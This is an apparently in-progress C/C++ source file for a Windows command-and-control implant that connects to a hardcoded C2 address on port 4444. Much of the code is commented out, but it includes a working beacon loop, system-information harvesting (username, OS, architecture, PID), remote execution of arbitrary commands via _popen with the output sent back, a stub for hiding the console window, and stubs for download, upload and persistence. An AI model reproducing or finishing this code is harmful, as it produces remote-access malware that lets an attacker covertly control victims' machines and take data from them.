#include "client.h"


#include <stdio.h>
#include <string.h>
#include <windows.h>
//#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

//#define SERVER_IP "10.0.0.86"  // Localhost for testing
#define SERVER_IP "172.18.245.234"
#define SERVER_PORT 4444
#define BUFFER_SIZE 1024

// TODO: move this somewhere else. and maybe make them enums?
#define SUCCESSFUL 0

// Command structure
typedef struct {
    char action[50];
    char target[100];
    char options[200];
} Command;

// Parse commands from server
Command parse_command(char* buffer) {
    Command cmd = {0};
    
    // Simple parsing: "action:target:options"
    char* token = strtok(buffer, ":");
    if (token) strncpy(cmd.action, token, sizeof(cmd.action) - 1);
    
    token = strtok(NULL, ":");
    if (token) strncpy(cmd.target, token, sizeof(cmd.target) - 1);
    
    token = strtok(NULL, "\n");
    if (token) strncpy(cmd.options, token, sizeof(cmd.options) - 1);
    
    return cmd;
}

// Execute commands
void execute_command(Command cmd) {
    printf("Executing: %s -> %s [%s]\n", cmd.action, cmd.target, cmd.options);
    
    if (strcmp(cmd.action, "download") == 0) {
        printf("[+] Downloading: %s\n", cmd.target);
    }
    else if (strcmp(cmd.action, "upload") == 0) {
        printf("[+] Uploading: %s\n", cmd.target);
    }
    else if (strcmp(cmd.action, "execute") == 0) {
        printf("[+] Executing: %s\n", cmd.target);
    }
    else if (strcmp(cmd.action, "systeminfo") == 0) {
        printf("[+] Gathering system information...\n");
    }
    else if (strcmp(cmd.action, "persist") == 0) {
        printf("[+] Establishing persistence...\n");
    }
    else {
        printf("[-] Unknown command: %s\n", cmd.action);
    }
}

// Send response back to server
void send_response(SOCKET sock, char* message) {
    char response[BUFFER_SIZE];
    snprintf(response, sizeof(response), "RESPONSE:%s\n", message);
    send(sock, response, strlen(response), 0);
}

/*
int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_addr.s_addr = inet_addr(SERVER_IP);
        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            printf("[-] Connection failed, retrying in 10s...\n");
            closesocket(sock);
            Sleep(10000);
            continue;
        }
        
        printf("[+] Connected to server\n");
        send(sock, "READY\n", 6, 0);
        
        // Command loop
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int size = recv(sock, buffer, sizeof(buffer) - 1, 0);
            
            if (size <= 0) {
                printf("[-] Connection lost\n");
                break;
            }
            
            buffer[size] = '\0';
            printf("[+] Received: %s", buffer);
            
            // Parse and execute command
            Command cmd = parse_command(buffer);
            execute_command(cmd);
            
            // Send acknowledgement
            send_response(sock, "Command executed");
        }
        
        closesocket(sock);
        Sleep(5000); // Wait before reconnecting
    }
    
    WSACleanup();
    return 0;
}*/


//g++ -o implant.exe main_implant.cpp implant.cpp -lws2_32 -static -std=c++11
// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 -lstdc++
// client.cpp

Client::Client() : 
    socket_(INVALID_SOCKET),
    connected_(false),
    initalized_(false)
{
    // TODO: add logic to check if winsock version 2.2 is avaiable?
    //       this will need to be added/handled if planning on targeting windows xp and before

    WSADATA wsaData;
    WORD wVersionRequired = MAKEWORD(2,2); // use winsock version 2.2
    if (WSAStartup(wVersionRequired, &wsaData) != 0)
    {
        // throw error
    }
    initalized_ = true;

    // TODO: assign client an id? so server can keep track of all the clients
    // TODO: add bool that checks/marks the client as initalized?
}

Client::~Client()
{
    if (initalized_)
    {
        WSACleanup();
    }
}

bool Client::createSocket(int af, int type, int protocol)
{
    // TODO: add closesocket() ? 
    socket_ = socket(af, type, protocol);
    if (socket_ == INVALID_SOCKET)
    {
        return false;
    }

    connected_ = false;
    return true;
}

bool Client::createConnection(const std::string& host, const std::string& port)
{
    ADDRINFOA hints, *result= nullptr; // struct addrinfo 

    ZeroMemory(&hints, sizeof(hints));
    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve address
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
    {
        return false;
    }

    bool connected = false;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
        {
            connected = true;
            break;
        }
    }
    freeaddrinfo(result);
    connected_ = connected;
    return connected;
}

//void Client::receiveData()
std::string Client::receiveData()
{
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
    int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
    
    if (result > 0) 
    {
        // Success - create string from the received data
        return std::string(recvBuffer_, result);
    } 
    else if (result == 0) 
    {
        // Connection closed by server
        connected_ = false;
        throw std::runtime_error("Connection closed by server");
    } 
    else 
    {
        // Error occurred
        connected_ = false;
        throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
    }
}

void Client::sendData(const std::string& data) {
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
    int result = send(socket_, data.c_str(), data.length(), 0);
    
    if (result == SOCKET_ERROR) {
        connected_ = false;
        throw std::runtime_error("Send failed: " + std::to_string(WSAGetLastError()));
    }
    
    //return result;  // Returns number of bytes actually sent
}

void Client::run(const std::string& host, const std::string& port)
{
    // Ensure socket is created
    if (socket_ == INVALID_SOCKET && !createSocket()) {
        std::cerr << "Failed to create socket" << std::endl;
        return;
    }
    
    // Connect to server
    if (!createConnection(host, port)) {
        std::cerr << "Failed to connect to " << host << ":" << port << std::endl;
        return;
    }
    
    std::cout << "Connected to " << host << ":" << port << ". Waiting for commands..." << std::endl;
    
    // Wait for incoming data from server
    while (connected_) {
        try {
            std::string command = receiveData();
            //sendData(command);
            std::cout << "Server command: " << command << std::endl;
            
        } catch (const std::exception& e) {
            std::cerr << "Connection lost: " << e.what() << std::endl;
            break;
        }
    }
    
    std::cout << "Disconnected from server" << std::endl;
} 


/*
using namespace std;

// BasicImplant implementation
BasicImplant::BasicImplant(const string& host, int port) 
    : c2_host(host), c2_port(port), checkin_interval(60), running(false) {
    
    implant_id = ImplantUtils::generate_implant_id();
    
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        throw runtime_error("WSAStartup failed: " + to_string(WSAGetLastError()));
    }
}

BasicImplant::~BasicImplant() {
    stop();
    WSACleanup();
}

string BasicImplant::get_username() {
    CHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return string(username);
    }
    return "unknown";
}

string BasicImplant::get_architecture(SYSTEM_INFO& sys_info) {
    switch (sys_info.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
        case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
        default: return "unknown";
    }
}

string BasicImplant::get_os_version(OSVERSIONINFOA& os_info) {
    return "Windows " + to_string(os_info.dwMajorVersion) + "." + 
           to_string(os_info.dwMinorVersion) + " Build " + 
           to_string(os_info.dwBuildNumber);
}

string BasicImplant::get_system_info() {
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    OSVERSIONINFOA os_info;
    os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&os_info);
    
    string info = "user:" + get_username();
    info += "|arch:" + get_architecture(sys_info);
    info += "|os:" + get_os_version(os_info);
    info += "|pid:" + to_string(GetCurrentProcessId());
    info += "|tickcount:" + to_string(GetTickCount());
    
    return info;
}

string BasicImplant::execute_command(const string& command) {
    string result;
    
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "error:Failed to execute command: " + command;
    }
    
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    
    int return_code = _pclose(pipe);
    result += "|return_code:" + to_string(return_code);
    
    return "success:" + result;
}

string BasicImplant::send_to_c2(const string& message) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        return "error:Socket creation failed: " + to_string(WSAGetLastError());
    }
    
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(c2_port);
    inet_pton(AF_INET, c2_host.c_str(), &server_addr.sin_addr);
    
    // Set timeouts
    DWORD timeout = 10000; // 10 seconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "error:Connection failed to " + c2_host + ":" + to_string(c2_port);
    }
    
    // Send message
    if (send(sock, message.c_str(), message.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return "error:Send failed: " + to_string(WSAGetLastError());
    }
    
    // Receive response
    char buffer[1024];
    int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    closesocket(sock);
    
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        return string(buffer);
    }
    else if (bytes_received == 0) {
        return "error:Connection closed by server";
    }
    else {
        return "error:Receive failed: " + to_string(WSAGetLastError());
    }
}

void BasicImplant::parse_response(const string& response) {
    istringstream stream(response);
    string token;
    
    while (getline(stream, token, '|')) {
        size_t pos = token.find(':');
        if (pos != string::npos) {
            string key = token.substr(0, pos);
            string value = token.substr(pos + 1);
            
            if (key == "commands" && value != "none") {
                istringstream cmd_stream(value);
                string command;
                
                while (getline(cmd_stream, command, ';')) {
                    if (!command.empty()) {
                        execute_queued_command(command);
                    }
                }
            }
            else if (key == "checkin") {
                checkin_interval = stoi(value);
                cout << "Checkin interval set to: " << checkin_interval << " seconds" << endl;
            }
            else if (key == "status") {
                if (value == "success") {
                    cout << "Command executed successfully" << endl;
                }
                else if (value == "error") {
                    cout << "Command failed" << endl;
                }
            }
        }
    }
}

void BasicImplant::execute_queued_command(const string& command) {
    cout << "Executing queued command: " << command << endl;
    
    if (command.find(C2Protocol::CMD_EXECUTE + ":") == 0) {
        string cmd = command.substr(C2Protocol::CMD_EXECUTE.length() + 1);
        string result = execute_command(cmd);
        
        string result_msg = ImplantUtils::format_message(
            implant_id, C2Protocol::CMD_TASK_RESULT, result);
        send_to_c2(result_msg);
    }
    else if (command == C2Protocol::CMD_SYSINFO) {
        string info = get_system_info();
        string info_msg = ImplantUtils::format_message(
            implant_id, "sysinfo_result", info);
        send_to_c2(info_msg);
    }
}

void BasicImplant::process_c2_commands(const string& response) {
    parse_response(response);
}

void BasicImplant::beacon() {
    running = true;
    cout << "Implant ID: " << implant_id << endl;
    cout << "C2 Server: " << c2_host << ":" << c2_port << endl;
    cout << "Starting beacon loop..." << endl;
    
    while (running) {
        try {
            string message = ImplantUtils::format_message(
                implant_id, C2Protocol::CMD_CHECKIN, get_system_info());
            
            string response = send_to_c2(message);
            
            if (response.find("error:") != 0) {
                cout << "Beacon successful" << endl;
                process_c2_commands(response);
            }
            else {
                cout << "Beacon failed: " << response << endl;
            }
        }
        catch (const exception& e) {
            cout << "Beacon error: " << e.what() << endl;
        }
        
        ImplantUtils::sleep_seconds(checkin_interval);
    }
}

void BasicImplant::stop() {
    running = false;
}

// ImplantUtils implementation
namespace ImplantUtils {
    void stealth_mode() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            // ShowWindow(hwnd, SW_HIDE);  // Uncomment for stealth
        }
    }
    
    string generate_implant_id() {
        string id = "implant_";
        id += to_string(GetCurrentProcessId());
        id += "_";
        id += to_string(GetTickCount());
        id += "_";
        id += to_string(time(nullptr));
        return id;
    }
    
    string format_message(const string& implant_id, const string& command, const string& data) {
        return implant_id + C2Protocol::DELIMITER + command + C2Protocol::DELIMITER + data;
    }
    
    string url_encode(const string& value) {
        // Basic URL encoding implementation
        ostringstream escaped;
        escaped.fill('0');
        escaped << hex;
        
        for (char c : value) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                escaped << c;
            }
            else {
                escaped << '%' << setw(2) << int((unsigned char)c);
            }
        }
        
        return escaped.str();
    }
    
    void sleep_seconds(int seconds) {
        for (int i = 0; i < seconds; i++) {
            this_thread::sleep_for(chrono::seconds(1));
        }
    }
}
*/

int main()
{
    Client tcpClient;
    tcpClient.run("172.18.245.234", "4444");
}